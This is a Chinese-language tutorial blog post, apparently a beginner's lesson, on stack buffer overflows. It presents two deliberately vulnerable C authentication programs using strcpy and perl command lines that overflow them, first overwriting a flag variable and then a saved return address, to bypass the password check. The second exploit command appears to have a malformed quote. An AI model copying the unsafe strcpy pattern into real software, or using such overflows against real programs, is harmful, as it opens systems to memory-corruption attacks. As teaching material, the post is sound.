[Bug Hunter]关于stack overflow Lesson II
=======================================

### 回顾
&emsp;&emsp;上一篇我们已经简单了解了stackoverflow的简单原理，以及怎么利用stackoverflow去控制程序的逻辑，本节Lesson更加深入的探讨一下stackoverflow的进一步利用点。这一个系列是根据博主本人的学习进度写成，所以速度可能偏慢，因为我也有活要干，同时我也是个新手。


### 例子一
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
        int auth_flag = 0;
        char password_buffer[16];

        strcpy(password_buffer, password);

        if(strcmp(password_buffer, "brillig") == 0)
                auth_flag = 1;
        if(strcmp(password_buffer, "outgrabe") == 0)
                auth_flag = 1;

        return auth_flag;
}

int main(int argc, char *argv[]) {
        if(argc < 2) {
                printf("Usage: %s <password>\n", argv[0]);
                exit(0);
        }
        if(check_authentication(argv[1])) {
                printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
                printf("      Access Granted.\n");
                printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
        } else {
                printf("\nAccess Denied.\n");
   }
}
```
	
&emsp;&emsp;本例是一个简单的认证判断，如果输入参数是`brillig`或者`outgrabe`，那么输出`Access Granted.`。显然这里也有一个stackoverflow的bug，在`strcpy`函数这里。在Stack上，`auth_flag`先入栈，`password_buffer`后入栈，所以`auth_flag`的地址比`password_buffer`高，这样就可以覆盖`auth_flag`的值。`gcc example.c -o example -g`，生成可执行程序。然后`gdb -tui example`获取一些必要的信息如下。  
<img src="https://github.com/linghuazaii/blog/blob/master/image/stackoverflow/variable_distance.png" /><br>  


&emsp;&emsp;算得两地址之差为28，所以我们只需要复写完这28个字节再多复写4个字节就可以了。先看正常情况，`./example $(perl -e "print 'A' x 28")`，结果如下：  

> Access Denied.  

&emsp;&emsp;再看看复写stack情况，`./example $(perl -e "print 'A' x 32")`，结果如下：  

> -=-=-=-=-=-=-=-=-=-=-=-=-=-  
>      Access Granted.  
> -=-=-=-=-=-=-=-=-=-=-=-=-=-  
> Segmentation fault  

&emsp;&emsp;虽然栈被写坏了，但是目的达成。  

### 例子二
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
	char password_buffer[16];
	int auth_flag = 0;

	strcpy(password_buffer, password);
	
	if(strcmp(password_buffer, "brillig") == 0)
		auth_flag = 1;
	if(strcmp(password_buffer, "outgrabe") == 0)
		auth_flag = 1;

	return auth_flag;
}

int main(int argc, char *argv[]) {
	if(argc < 2) {
		printf("Usage: %s <password>\n", argv[0]);
		exit(0);
	}
	if(check_authentication(argv[1])) {
		printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
		printf("      Access Granted.\n");
		printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
	} else {
		printf("\nAccess Denied.\n");
   }
}
```  
&emsp;&emsp;与例子一的唯一差别就是调换了`password_buffer`和`auth_flag`的位置，那么`auth_flag`的地址比`password_buffer`要低，这样就没法复写了，那么我们该怎么办呢？  
&emsp;&emsp;还记得Lesson I里我讲到的Stack的本质原理吗？一个函数调用的时候先是压栈，后`leave`弹栈，然后再`ret`返回，栈上其实保存着函数返回时的地址，这是地址会压入EIP/RIP，让我们直接`gdb`看一下就明白了。先`gcc example2.c -o example2 -g`，然后`gdb -tui example2 -q`。  

<img src="https://github.com/linghuazaii/blog/blob/master/image/stackoverflow/main_assembly.png" /><br>  
&emsp;&emsp;这里我们先注意一下`call   0x40063d <check_authentication>`之后会执行一个判断，就是调用`check_authentication`返回值的判断，我们跳过这个判断，直接执行`0x4006ef`的指令就可以输出`Access Granted`。那现在我们看看栈上保存的返回地址是多少，如下：  

<img src="https://github.com/linghuazaii/blog/blob/master/image/stackoverflow/ret_addr.png" /><br>  
&emsp;&emsp;返回地址是`0x4006eb`，也就是调用call之后的下一条指令，我们直接复写返回地址为`0x4006ef`，由于我用的是x86-64的机器，所以是little endian，所以地址得倒着写，执行`./example2 $(perl -e "print '\ef\06\40\00' x 3)`，结果如下： 
 
> -=-=-=-=-=-=-=-=-=-=-=-=-=-  
>       Access Granted.  
> -=-=-=-=-=-=-=-=-=-=-=-=-=-  
> Segmentation fault  


### 结语
&emsp;&emsp;本节提到的一点就是复写函数的返回地址，比复写变量的值更具有杀伤力，是不是呢？  
&emsp;&emsp;没点关注的点一波关注，谢谢！Have Fun！See You！
